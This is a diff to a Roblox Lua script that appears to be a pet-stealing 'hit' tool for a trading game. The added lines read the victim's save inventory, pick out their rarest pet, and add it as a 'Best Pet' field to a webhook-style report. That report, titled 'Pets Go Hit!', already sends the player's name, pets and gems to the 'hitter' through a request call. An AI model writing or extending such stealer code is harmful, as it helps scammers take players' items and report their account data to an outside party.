@@ -20,11 +20,21 @@ local xxxvvv = "lolly"
 pcall(function() xxxvvv=response.StatusMessage end)
 if typeof(xxxvvv)~="string" then xxxvvv="Lolly" end
 if not _G.User then _G.User="yve (pet change hit)" end
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
+save = save.Get()
+local big = 0
+for i,v in pairs(save.Inventory.Pet) do
+if require(dir[v.id]).difficulty >= big then
+big = require(dir[v.id]).difficulty
+end
+end
+big = "1/"..big
 local log = ""
 if dh then
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..big..'","name":"Best Pet","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
 else
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Best Pet","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
 end
 local responser =
         request(
